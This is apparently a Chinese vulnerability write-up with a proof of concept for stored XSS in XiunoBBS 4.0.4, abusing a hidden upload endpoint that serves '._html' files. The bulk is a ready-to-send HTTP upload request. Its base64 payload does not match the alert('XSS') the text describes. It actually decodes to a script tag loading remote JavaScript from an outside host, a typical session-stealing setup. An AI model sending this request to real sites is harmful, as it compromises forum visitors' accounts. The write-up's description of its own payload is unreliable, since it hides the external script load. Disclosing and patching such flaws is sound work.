## XiunoBBS XSS

影响版本：Xiuno BBS 4.0.4

原理，由任意文件上传导致的XSS，此框架存在隐藏文件上传接口，但是不会解析成php等脚本语言。上传文件后缀会添加下划线，假如你上传了`index.php`，它会将你上传的文件改为`index._php`，经过测试发现`._html`文件仍然会解析`JS`内容。

poc：

```
POST /?attach-create.htm HTTP/1.1
Host:
Connection: close
Content-Length: 174
sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
Accept: text/plain, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: xxx

is_image=0&width=0&height=0&name=test.html&data=data%3Atext%2Fhtml%3Bbase64%2CPHNDUmlQdCBzUkM9Ly91ai5jaS9xVVlOPjwvc0NySXBUPg%3D%3D
```

携带参数内容为：

```
data:text/html;base64,<script>alert("XSS");</script></sCrIpT>
```

将上述`<script>alert("XSS");</script>`经过 base64 加密：

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+
```

再整体 URL 编码形成最终 payload：

```
data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ%2B
```

上传完成后再访问文件内容即可触发XSS

<img src="img/1.png" >
